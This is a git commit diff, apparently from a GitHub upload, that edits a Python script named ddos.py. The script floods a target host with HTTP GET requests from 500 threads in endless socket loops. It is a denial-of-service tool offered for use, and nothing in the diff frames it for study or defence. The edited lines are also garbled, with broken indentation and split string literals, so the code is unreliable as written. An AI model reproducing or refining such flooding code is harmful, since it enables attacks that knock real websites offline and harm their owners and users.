ad4a26b360d12c094edd0dd1bbaabec4bfefec3c
chrstianjames <113699127+chrstianjames@users.noreply.github.com>
2025-03-20 00:10:27 +0800

    Add files via upload

--- ddos.py
+++ ddos.py
@@ -9,11 +9,15 @@ def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
-        s.sendto((f"GET / HTTP/1.1
-Host: {target}
+s.sendto((f"GET / HTTP/1.1\r
+"
+          f"Host: {target}\r
+"
+          f"Connection: close\r
 ").encode(), (target, port))
         s.close()
 
 for i in range(500):  # adjust thread count
     thread = threading.Thread(target=attack)
     thread.start()
+  
